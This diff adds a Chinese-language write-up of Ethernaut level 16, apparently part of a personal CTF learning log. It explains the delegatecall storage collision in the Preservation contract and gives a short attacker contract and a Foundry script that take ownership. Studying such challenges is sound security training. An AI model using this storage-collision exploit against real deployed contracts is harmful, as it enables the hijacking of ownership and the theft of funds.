@@ -614,4 +614,42 @@ ps：脚本还在测试中
 
 ps：脚本正在测试中
 
+
+
+### 2024.09.13
+
+[The Ethernaut level 16](https://ethernaut.openzeppelin.com/level/16)
+
+这一关的目的是解锁获取 Preservation 合约的所有权。
+
+仔细阅读这个合约，发现 `Preservation` 使用了 `delegatecall`。这就很容易发生存储冲突的问题。果不其然，`LibraryContract` 的 `setTime` 函数修改 `storedTime` 变量。该变量在 `LibraryContract` 合约是在 `slot0`。但是由于是 `delegatecall`，真正被修改的是 调用者，即 Preservation 合约的 `slot0`。·
+
+要想成为 owner，可以利用这个漏洞，调用 `setFirstTime` 时 把 `timeZone1Library` 改为攻击者合约。再次调用 `setFirstTime` 时，使用的是攻击者合约的逻辑。可以在攻击者合约部署和 `Preservation` 一样的存储，进而修改 `owner`
+
+攻击者合约：
+```
+contract Attacker {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 time) public {
+        owner = address(uint160(time));
+    }
+}
+```
+
+攻击脚本：
+```
+address player = vm.addr(1);
+vm.startPrank(player);
+
+level.setFirstTime(uint256(uint160(address(attacker))));
+
+level.setFirstTime(uint256(uint160(address(player))));
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/test/level16.s.sol)
+
+
 <!-- Content_END -->
